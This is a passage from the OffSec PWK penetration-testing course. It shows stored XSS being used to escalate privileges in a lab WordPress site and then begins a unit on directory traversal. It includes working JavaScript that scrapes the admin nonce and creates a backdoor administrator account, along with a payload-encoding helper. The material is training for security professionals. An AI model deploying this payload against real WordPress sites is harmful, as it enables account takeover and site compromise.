### Penetration Testing with Kali Linux

#### 8.4.5 Privilege Escalation via XSS

**Figure 114: Demonstrating the XSS Vulnerability**

We have successfully injected an XSS payload into the web application’s database, and it will be served to any administrator who loads the plugin. While a simple alert window is a basic example of what can be achieved with XSS, let's explore a more advanced scenario, such as creating a new administrative account.

Since we can now store JavaScript code within the target WordPress application and have it executed by the admin user when loading the page, we can get more creative and explore different avenues for obtaining administrative privileges.

One approach is to leverage our XSS vulnerability to steal cookies and session information if the application uses an insecure session management configuration. If we can steal an authenticated user’s cookie, we can masquerade as that user within the target website.

**Cookies and Session Management**

Websites use cookies to track state and user information. Cookies can be set with several optional flags, including two that are particularly relevant to penetration testers: `Secure` and `HttpOnly`.

- **Secure Flag**: This flag instructs the browser to only send the cookie over encrypted connections, such as HTTPS. This protects the cookie from being sent in clear text and captured over the network.
- **HttpOnly Flag**: This flag instructs the browser to deny JavaScript access to the cookie. If this flag is not set, we can use an XSS payload to steal the cookie.

Let's verify the nature of WordPress' session cookies by first logging in as the admin user. Next, we can open the Web Developer Tools, navigate to the Storage tab, and then click on `http://offsecwp` under the Cookies menu on the left.

**Figure 115: Inspecting WordPress Cookies**

We notice that our browser has stored six different cookies, but only four are session cookies. Of these four, if we exclude the negligible `wordpress_test_cookie`, all support the `HttpOnly` feature. Since all the session cookies can be sent only via HTTP, they cannot be retrieved via JavaScript through our attack vector. We’ll need to find a new angle.

When the admin loads the Visitors plugin dashboard containing the injected JavaScript, it executes whatever we provided as a payload, whether it's an alert pop-up banner or a more complex JavaScript function.

For instance, we could craft a JavaScript function that adds another WordPress administrative account. Once the real administrator executes our injected code, the function will execute behind the scenes.

To succeed with this attack, we need to cover another web application attack class. We’ll build a similar scenario as depicted by Shift8. First, we’ll create a JavaScript function that fetches the WordPress admin nonce.

**Nonce and CSRF Prevention**

The nonce is a server-generated token included in each HTTP request to add randomness and prevent Cross-Site Request Forgery (CSRF) attacks. A CSRF attack occurs via social engineering, where the victim clicks on a malicious link that performs a preconfigured action on behalf of the user.

**Listing 123 - CSRF Example Attack**

```
Check out these awesome cat memes!
```

In the above example, the URL link points to a Fake Crypto Bank website API, which performs a bitcoin transfer to the attacker's account. If this link was embedded in the HTML code of an email, the user would see only the link description, not the actual HTTP resource. The attack would be successful if the user is already logged in with a valid session on the same website.

By including and checking the pseudo-random nonce, WordPress prevents this kind of attack, as an attacker could not have prior knowledge of the token. However, as we’ll soon explain, the nonce won’t be an obstacle for the stored XSS vulnerability we discovered in the plugin.

To perform any administrative action, we need to first gather the nonce. We can accomplish this using the following JavaScript function:

**Listing 124 - Gathering WordPress Nonce**

```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

This function performs a new HTTP request towards the `/wp-admin/user-new.php` URL and saves the nonce value found in the HTTP response based on the regular expression. The regex pattern matches any alphanumeric value contained between the string `ser" value="` and double quotes.

Now that we’ve dynamically retrieved the nonce, we can craft the main function responsible for creating the new admin user.

**Listing 125 - Creating a New WordPress Administrator Account**

```javascript
var params = "action=createuser&_wpnonce_create-user=" + nonce + "&user_login=attacker&email=PI:EMAIL&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

Highlighted in this function is the new backdoored admin account, just after the nonce we obtained previously. If our attack succeeds, we’ll gain administrative access to the entire WordPress installation.

To ensure that our JavaScript payload will be handled correctly by Burp and the target application, we need to minify and encode it. To minify our attack code into a one-liner, we can use JS Compress.

**Figure 116: Minifying the XSS Attack Code**

Once we have clicked on "Compress JavaScript," we’ll copy the output and save it locally. As a final step, we will encode the minified JavaScript code to avoid bad characters interfering with the payload. We can do this using the following function:

```javascript
function encode_to_javascript(string) {
    var input = string;
    var output = '';
    for (var pos = 0; pos < input.length; pos++) {
        output += '%' + input.charCodeAt(pos).toString(16);
    }
    return output;
}
```

By loading the plugin statistics, we should have executed the malicious script. Let’s verify if our attack succeeded by clicking on the Users menu on the left pane.

**Figure 120: Confirming that Our Attack Succeeded**

Excellent! Due to this XSS flaw, we managed to elevate our application privileges from a standard user to an administrator via a specially-crafted HTTP request. We could now advance our attack and gain access to the underlying host by crafting a custom WordPress plugin with an embedded web shell. We’ll cover web shells in more detail in another module.

### 8.5 Wrapping Up

In this module, we focused on the identification and enumeration of common web application vulnerabilities. We also exploited several common web application vulnerabilities, including API misconfigurations and Cross-Site Scripting. We concluded the module by leveraging an XSS vulnerability to gain administrative privileges on a vulnerable web application via a specially-crafted HTTP request.

### 9 Common Web Application Attacks

In this learning module, we will cover the following learning units:

- Directory Traversal
- File Inclusion Vulnerabilities
- File Upload Attack Vulnerabilities
- Command Injection

Web development is currently one of the most in-demand skills in IT. The combination of a shortage of skilled web developers, time constraints in projects, and rapidly changing technologies helps certain vulnerabilities occur repeatedly in a broad range of web applications. Regardless of the underlying technology stack, several common web application vulnerabilities can be found in many deployed applications.

In this module, we will cover four common web application attacks. We’ll begin with Directory Traversal and File Inclusion attacks. Next, we’ll learn how to abuse File Upload vulnerabilities with executable and non-executable files. Finally, we will explore Command Injection attacks.

#### 9.1 Directory Traversal

This learning unit covers the following learning objectives:

- Understand absolute and relative paths
- Learn how to exploit directory traversal vulnerabilities
- Use encoding for special characters

In this learning unit, we will examine Directory Traversal vulnerabilities. Before we explore how to exploit this kind of vulnerability, we’ll need to cover relative and absolute paths. We will also use the encoding of special characters to perform Directory Traversal attacks.

##### 9.1.1 Absolute vs Relative Paths

In this section, we’ll learn the difference between absolute and relative paths. To successfully exploit the vulnerabilities we’ll face later in this module, we need to specify paths to files we want to display, upload, include, or execute. Depending on the web application and vulnerability, we’ll use either absolute or relative paths. It is vital to understand the difference between these and how we can use them to specify file paths.

- **Absolute Path**: An absolute path specifies the full file system path, including all subdirectories. We can refer to an absolute path from any location in the filesystem. Absolute paths start with a forward slash (`/`), specifying the root file system on Linux. From there, we can navigate through the file system.

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.